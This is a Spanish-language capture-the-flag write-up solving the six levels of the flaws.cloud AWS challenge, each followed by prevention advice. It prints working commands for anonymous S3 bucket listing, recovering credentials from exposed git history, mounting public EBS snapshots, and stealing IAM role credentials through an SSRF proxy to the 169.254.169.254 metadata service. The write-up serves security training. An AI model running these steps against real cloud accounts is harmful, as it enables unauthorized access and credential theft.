

![1](</Writeups/Blogs/Flaws/img/1.png>)

# Overview

Este post es una explicacion de cada nivel de la pagina web [http://flaws.cloud/](http://flaws.cloud/)

Esta pagina contiene un challenge dividido en varios niveles, en cada uno de ellos se toca una vulnerabilidad tipica o fallos comunes cuando se usa Amazon Web Services (AWS)

## Nivel 1 - Mala implementacion de los permisos 1

Bien, el primer nivel trata en que el servidor tiene puestos demasiados permisos para los usuarios normales y puedes acceder a los recursos sin problema

Una de las primeras cosas sera comprobar si el servidor es S3, para comprobar esto usaremos el comando dig para ver la IP de esa URL (atentando contra el dominio principal)

```bash
dig +nocmd flaws.cloud any +multiline +noall +answer
```

La IP que nos de la tendremos que poner en el buscador, si nos lleva a `https://aws.amazon.com/es/s3/` significa que estamos ante un servidor S3

Con esto en claro podemos usar el comando nslookup para ver mas información de esa web

```bash
nslookup 52.92.184.115
```

Esto nos dará información como: `name = s3-website-us-west-2.amazonaws.com.` que dice claramente la region del AWS

Gracias a la region podemos usar el comando aws para listar la información de este servicio

```bash
aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2
```

En caso de no saber la region podemos probar, ya que no son muchas

Si no nos reporta nada la herramienta podemos usar directamente la url

```text
http://s3.amazonaws.com/[bucket_name]/ = http://s3.amazonaws.com/flaws.cloud/
-
http://[bucket_name].s3.amazonaws.com/ = http://flaws.cloud.s3.amazonaws.com/
```

### Prevención del Nivel 1

Para solucionar esta explotación sera bastante simple, por defecto los buckets S3 son privados y seguros, esta vuln se explota cuando esta activado el “Static Web Hosting” y sobretodo por permitir a todo el mundo permisos de listado

![1](</Writeups/Blogs/Flaws/img/2.png>)

Esta vulnerabilidad puede llevar a estas explotaciones:

- Directory listing of S3 bucket of Legal Robot ([link](https://hackerone.com/reports/163476)) and Shopify ([link](https://hackerone.com/reports/57505)).
- Read and write permissions to S3 bucket for Shopify again ([link](https://hackerone.com/reports/111643)) and Udemy ([link](https://hackerone.com/reports/131468)). This challenge did not have read and write permissions, as that would destroy the challenge for other players, but it is a common problem.

## Nivel 2 - Mala implementacion de los permisos 2

Este segundo nivel es tambien muy simple, sera basicamente lo mismo de antes, pero esta vez necesitaremos crearnos una cuenta de AWS, para hacer el escaneo con esa cuenta.

Para ver información mas precisa de un dominio, para esto usamos el AWS de esta forma

- El perfil hay que crearlo antes con el comando: `aws configure --profile rugalo`

```bash
aws s3 --profile rugalo ls s3://flaws.cloud/
```

### Prevención del nivel 2

La manera de evitar esto es muy similar a la anterior, y es no darle permisos a nadie aunque este autenticado

![1](</Writeups/Blogs/Flaws/img/3.png>)

Esta vulnerabilidad puede llevar a estas explotaciones:

- Open permissions for authenticated AWS user on Shopify ([link](https://hackerone.com/reports/98819))

## Nivel 3 - Mala implementacion de los permisos 3

En este tercer nivel no encontremos ningún subdirectorio accesible pero si uno oculto, si ese es el caso ya que no lo podremos enumerar a través de la web, tendremos que descargarnoslo, para esto usaremos en vez del **ls** el **sync**

```bash
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2
```

El hecho de que tenga el **.git** expuesto es un peligro, ya que se puede sacar información sensible ya que puedes ver los logs a ver si alguien ha añadido algo que no debía, aunque lo halla borrado podrás verlo

```bash
git log
```

Con el id del commit podemos ver en detalle que paso

```bash
git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
```

Aqui encontramos un archivo que tiene credenciale, y podemos usar esas credenciales para ver toda la información de ese servicio

- El perfil flaws esta creado con las credenciales que hemos obtenido

```bash
aws --profile flaws s3 ls
```

### Prevención del nivel 3

La manera para que no nos pase esto esta clara, no dejar archivos con las keys por ahí, las keys son de lo mas importante en un servicio cloud

Un ejemplo de este problema:

- [Instagram’s Million Dollar Bug](http://www.exfiltrated.com/research-Instagram-RCE.php): In this must read post, a bug bounty researcher uncovered a series of flaws, including finding an S3 bucket that had .tar.gz archives of various revisions of files. One of these archives contained AWS creds that then allowed the researcher to access all S3 buckets of Instagram. For more discussion of how some of the problems discovered could have been avoided, see the post [“Instagram’s Million Dollar Bug”: Case study for defense](https://summitroute.com/blog/2015/12/24/instagram_bounty_case_study_for_defense/)

## Nivel 4 - Snapshots sin encriptar

En este nivel el servidor tiene una pagina EC2 corriendo, normalmente estas se usan para los backups

Como tenemos las credenciales (las que hemos obtenido en el caso anterior) podemos listar el nombre de usuario y algo mas de información

```bash
aws --profile flaws sts get-caller-identity
```

Este seria el nombre de usuario

![1](</Writeups/Blogs/Flaws/img/4.png>)

Con el nombre de usuario y su numero de cuenta podemos listar la snapshot

```bash
aws --profile flaws ec2 describe-snapshots --owner-id 975426262029
```

Ahora que tenemos la id de la snapshot podemos intentar crear una montura en nuestro equipo, para ver el contenido

Creamos el volumen usando la snapshot

```bash
aws --profile rugalo ec2 create-volume --availability-zone us-west-2a --region us-west-2 --snapshot-id snap-0b49342abd1bdcb89
```

Nos vamos a nuestra cuenta, EC2 --> Volumenes (modificando la region a donde hallamos creado el volumen) y creamos una instantánea de este

![1](</Writeups/Blogs/Flaws/img/5.png>)

Ahora vamos a crear una instancia **Ubuntu**

![1](</Writeups/Blogs/Flaws/img/6.png>)

Dejamos todo lo demás en default excepto el par de claves, que las creamos de esta manera (se nos descargara la key, por lo que nos la ponemos en el directorio donde estemos trabajando)

![1](</Writeups/Blogs/Flaws/img/7.png>)

Añadimos el volumen (la instantánea de este)

![1](</Writeups/Blogs/Flaws/img/8.png>)

Lanzamos la instancia y le damos permisos a la key que nos hemos descargado

```bash
chmod 400 compromised.pem
```

Ahora nos conectamos e la instancia por ssh

```bash
ssh -i comp.pem ubuntu@35.92.167.183
```

Dentro de la maquina tendremos que listar la información de los volúmenes

```bash
lsblk
```

Y creamos una montura con el volumen que queramos

```bash
sudo mount /dev/xvdf1 /mnt
```

Ahora que esta montado en el /mnt simplemente nos tenemos que ir al /mnt/home/ubuntu y abrir el `setupNginx.sh`

### Prevención del nivel 4

Para evitar que pase lo que acabamos de hacer, seria teniendo mucho cuidado con las credenciales, a parte podemos encriptar las snapshots para que aun teniendo la key nadie pueda hacerse una montura (también podemos hacer la snapshot privada)

## Nivel 5 - Meta-datos expuestos

En este nivel tambien el servicio AWS tiene un EC2 expuesto, pero esta vez con los meta-datos públicos, de estos meta-datos podemos sacar mucha información, por lo que primero vamos a hacernos con ellos

Siempre en estos servicios de cloud hay una ip que es del servicio de meta-datos `169.254.169.254`

En este caso el servidor AWS tenga un proxy, podemos usar este para ver la información del servicio de meta-datos

```bash
curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/
```

A partir de ahí podemos listar distintas cosas, este seria un listado de varios endpoints importantes

```text
http://169.254.169.254/latest/meta-data/
-
http://169.254.169.254/latest/user-data
-
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
-
http://169.254.169.254/latest/meta-data/ami-id
-
http://169.254.169.254/latest/meta-data/reservation-id
-
http://169.254.169.254/latest/meta-data/hostname
-
http://169.254.169.254/latest/meta-data/public-keys/
-
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
-
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
-
http://169.254.169.254/latest/dynamic/instance-identity/document
-
http://169.254.170.2/v2/credentials/<UUID>
-
http://169.254.169.254/latest/dynamic/instance-identity/document
```

Cuando tengamos las credenciales podemos crear un nuevo perfil con estas (las credenciales son las del `/meta-data/iam/security-credentials/flaws`)

Pero no solo necesitamos crear el perfil, tenemos que cambiar el archivo `~/.aws/credentials`

En el perfil que acabamos de crear pondremos un campo nuevo, llamado `aws_session_token` donde introduciremos el token que hemos conseguido

![1](</Writeups/Blogs/Flaws/img/9.png>)

Con esto si lanzamos el escaneo usando este nuevo usuario nos dara el subdominio para llagar al ultimo nivel

```bash
aws --profile flaws3 s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
```

### Prevención del nivel 5

Para solucionar esto tenemos que asegurarnos de que ninguna aplicación deje conectarse a la IP `169.254.169.254` y a ningún rango de IPs ya sean locales o privadas, Tambien podemos verificar que los roles IAM estén restringidos lo máximo posible

Algunos ejemplos de lo que se podría hacer con esto seria:

- [Nicolas Grégoire](https://twitter.com/Agarri_FR) discovered that prezi allowed you point their servers at a URL to include as content in a slide, and this allowed you to point to 169.254.169.254 which provided the access key for the EC2 intance profile ([link](https://engineering.prezi.com/prezi-got-pwned-a-tale-of-responsible-disclosure-ccdc71bb6dd1?gi=c0ec39b6236a)). He also found issues with access to that magic IP with [Phabricator](https://hackerone.com/reports/53088) and [Coinbase](https://hackerone.com/reports/53004).

## Nivel 6 - Mala configuración del IAM (politicas)

Para este ultimo nivel nos dan unas credenciales, podemos usar estas para ver mas informacion del usuario

```bash
aws --profile flaws3 iam get-user
```

Ahora podemos ver las políticas de este

```bash
aws --profile flaws3 iam list-attached-user-policies --user-name Level6
```

Ahora tenemos que sacar la información de cada `política`

```bash
aws --profile flaws3 iam get-policy --policy-arn arn:aws:iam::975426262029:policy/MySecurityAudit
-
aws --profile flaws3 iam get-policy --policy-arn arn:aws:iam::975426262029:policy/list_apigateways
```

Lo mas importante de ahí son las `id de las versiones`, con estas ids podemos ver mas información sobre los permisos de cada una

```bash
aws --profile flaws3 iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/MySecurityAudit --version-id v1
-
aws --profile flaws3 iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4
```

Vamos a buscar la política que tenga los permisos permitidos (por lo general la política MySecurityAudit es mas permisiva que la list_apigateways)

![1](</Writeups/Blogs/Flaws/img/10.png>)

Ahora que sabemos que el MySecurityAudit tiene los permisos en permitido, podemos listar la función lambda de esta

```bash
aws --region us-west-2 --profile flaws3 lambda list-functions
```

Vale, como tenemos el nombre de la función podemos sacar la política de esta función lambda

```bash
aws --region us-west-2 --profile flaws3 lambda get-policy --function-name Level6
```

![1](</Writeups/Blogs/Flaws/img/11.png>)

Despues podemos ejecutar este recurso

```bash
aws --region us-west-2 --profile flaws3 apigateway get-stages --rest-api-id "s33ppypa75"
```

![1](</Writeups/Blogs/Flaws/img/12.png>)

Con esto podemos intentar conectarnos a ese stageName que nos dara la URL final para terminar este challenge

```bash
curl https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6
```

### Prevención del nivel 6

Para evitar esto, podemos simplemente no darle permisos a nadie, ni si quiera de solo lectura ya que eso puede hacer que un atacante entienda lo que hay en tu servidor, y por consecuencia le sea mucho mas fácil vulnerarlo
